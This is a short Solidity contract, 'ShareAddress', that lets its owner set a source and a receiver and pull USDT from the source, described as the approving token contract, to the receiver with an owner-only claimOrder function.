// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUSDShare {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// Sends USDT held by the token contract to one receiver. The token contract approves this
// contract for USDT in its constructor (_usdContractCoin).
contract ShareAddress {
    address public owner;
    IUSDShare public immutable usdt;
    address public source; // contract the USDT is pulled from (the token contract)
    address public receiver;

    event Shared(uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _owner, address _receiver, address _usdt) {
        require(_owner != address(0) && _receiver != address(0) && _usdt != address(0), "Zero address");
        owner = _owner;
        receiver = _receiver;
        usdt = IUSDShare(_usdt);
    }

    function setSource(address _source) external onlyOwner {
        source = _source;
    }

    function setReceiver(address _receiver) external onlyOwner {
        require(_receiver != address(0), "Zero address");
        receiver = _receiver;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        owner = newOwner;
    }

    function claimOrder(uint256 amount) external onlyOwner {
        require(source != address(0), "Source not set");
        require(usdt.transferFrom(source, receiver, amount), "Transfer failed");
        emit Shared(amount);
    }
}
